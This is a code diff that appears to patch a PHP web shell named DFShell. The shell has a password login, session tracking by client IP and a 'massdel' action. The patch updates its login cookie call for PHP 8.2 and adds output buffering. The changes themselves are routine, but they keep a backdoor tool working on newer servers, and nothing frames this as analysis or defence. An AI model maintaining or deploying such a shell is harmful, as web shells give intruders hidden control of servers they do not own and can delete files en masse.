@@ -226,7 +226,8 @@ class DFShell{
         }
         if($login_pass === $this->Dec(self::$pass)){
             $_SESSION['DFS_Auth']=sha1($GLOBALS['DFConfig'][2]['REMOTE_ADDR']);
-            setrawcookie('DFSVersion',$GLOBALS['DFShell_Ver'],(time()+18000),'/; SameSite=Strict',$GLOBALS['DFConfig'][2]['HTTP_HOST'],1,1);
+            // v2.6: PHP 8.2-safe cookie (legacy '/; SameSite=Strict' path hack throws ValueError on login)
+            setrawcookie('DFSVersion',(string)$GLOBALS['DFShell_Ver'],['expires'=>time()+18000,'path'=>'/','domain'=>$GLOBALS['DFConfig'][2]['HTTP_HOST'],'secure'=>true,'httponly'=>true,'samesite'=>'Strict']);
             return true;
         }else{
             echo "<script>alert('Wrong pass!');window.location.replace('".$GLOBALS['DFConfig'][2]['PHP_SELF']."')</script>";
@@ -3379,6 +3380,7 @@ if(!isset($_SESSION['DFS_Auth']) || empty($_SESSION['DFS_Auth'])){
         $contents = $shell->DFSRender("/%{DFSI}%/i",$chead,$contents);
         $contents = $shell->DFSBody("bodytop.html","/%{main}%/i",$contents);
         $contents = $shell->DFSRenderArray($toReplace,$contents);
+        ob_start();
         echo $contents;
 
         if(!isset($DFConfig[0]['dfp'])){
@@ -3429,5 +3431,6 @@ if(!isset($_SESSION['DFS_Auth']) || empty($_SESSION['DFS_Auth'])){
         $shell->DFSAction("massdel");
         $footer = $shell->DFSEnd();
         print($footer);
+        if(ob_get_level()>0) ob_end_flush();
     }
 }?>
